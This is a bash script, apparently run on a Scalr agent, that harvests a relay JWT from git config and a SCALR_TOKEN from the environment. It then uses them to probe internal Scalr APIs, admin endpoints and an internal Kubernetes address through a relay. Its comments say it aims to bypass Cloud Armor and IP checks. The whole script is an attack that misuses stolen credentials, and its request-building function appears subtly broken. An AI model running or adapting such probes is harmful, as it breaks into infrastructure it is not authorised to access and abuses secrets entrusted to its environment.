#!/bin/bash
JWT=$(grep -oP '(?<=x-relay-authorization:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
POOL=$(grep -oiP '(?<=x-relay-agent-pool-id:)\S+' "$XDG_CONFIG_HOME/git/config" 2>/dev/null)
echo "[agent_ip] $(hostname -I)"
echo "[jwt_exp] $(echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c 'import sys,json; print(json.loads(sys.stdin.read()+chr(0))["exp"])' 2>/dev/null)"

relay_get() {
  local label=$1; shift
  CODE=$(curl -sS -o /tmp/rout.bin -w "%{http_code}" --max-time 8 "$@" \
    -H "x-relay-authorization: $JWT" -H "X-Relay-Agent-Pool-ID: $POOL" \
    "https://relay.main.scalr.dev/$1" 2>/tmp/rerr.txt)
  # Try to decode gzip or plain text body
  BODY=$(python3 -c "
import sys,gzip,json
d=open('/tmp/rout.bin','rb').read()
try: d=gzip.decompress(d)
except: pass
try: print(json.loads(d.decode()))" 2>/dev/null | head -c 400)
  [ -z "$BODY" ] && BODY=$(cat /tmp/rout.bin | strings | head -c 200)
  ERR=$(cat /tmp/rerr.txt | tail -1)
  echo "[relay] $label → HTTP $CODE | $BODY | err=$ERR"
}

# We know HTTPS to internal.main.scalr.dev works (404 before)
# Try more paths — use the SCALR_TOKEN from env vars to authenticate
STOKEN="$SCALR_TOKEN"
echo "[scalr_token_len] ${#STOKEN}"

# Unauthenticated probes
relay_get "https://internal.main.scalr.dev/ping"
relay_get "https://internal.main.scalr.dev/api/iacp/v3/accounts"  # no auth

# Authenticated probes — use agent's SCALR_TOKEN to hit internal API (bypasses Cloud Armor)
relay_get "https://internal.main.scalr.dev/api/iacp/v3/workspaces?filter%5Baccount%5D=acc-v0p14gmusfk03k3e0" \
  -H "Authorization: Bearer $STOKEN" -H "Accept: application/vnd.api+json"

relay_get "https://internal.main.scalr.dev/api/iacp/v3/accounts/acc-v0p14gmusfk03k3e0" \
  -H "Authorization: Bearer $STOKEN" -H "Accept: application/vnd.api+json"

# OTEL via HTTPS (different port via relay)
relay_get "https://otel.main.scalr.dev/"

# GKE k8s API via HTTPS hostname (kubernetes.default is blocked but specific hostnames?)
relay_get "https://10.30.0.1/"  # likely forbidden (IP in allowed_internal_networks)

# Try admin endpoints that might bypass IP checks
relay_get "https://internal.main.scalr.dev/api/admin/v1/accounts" \
  -H "Authorization: Bearer $STOKEN"

echo "[done]"
